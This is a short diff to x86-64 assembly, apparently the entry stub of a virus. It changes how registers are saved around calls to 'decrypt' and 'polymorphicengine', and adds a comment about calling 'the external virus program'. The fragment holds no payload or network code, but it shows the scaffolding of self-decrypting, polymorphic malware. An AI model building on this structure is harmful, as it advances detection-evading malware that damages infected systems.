@@ -19,22 +19,19 @@ _start:             ; Global entry point
 	;do this the first action to preserve integrity of rsp as the value of rsp will change every instruction parsed
 	mov rbx, rsp
 
-	; create space to save state in rsp
-	push rbp
-	mov  rbp, rsp
-	sub  rsp, 0x18
-
-	;save data initial program state
-	mov [rbp-0x18],	rdi 
-	mov [rbp-0x10],	rsi
+	; save current state on stack
+	push rsp
+	push rdi
+	push rsi
 
     call decrypt
 
 	; reload the initial program, state
-	mov rdi, [rbp-0x18]
-	mov rsi, [rbp-0x10]
-	mov rsp, rbx
+	pop rsi
+	pop rdi
+	pop rsp
 
+	; save current state on stack
 	push rsp
 	push rdi
 	push rsi
@@ -47,15 +44,12 @@ _start:             ; Global entry point
 	push rdi
 	call polymorphicengine
 	
+	; reload the initial program, state
 	pop rsi
 	pop rdi
 	pop rsp
 
-	; ; reload the initial program, state
-	; mov rdi, [rbp-0x18]
-	; mov rsi, [rbp-0x10]
-
-	; DO NOT TOUCH CALLING MAIN
+	; call the external virus program
 	xor rbp, rbp
 	pop rdi
 	mov rsi, rsp
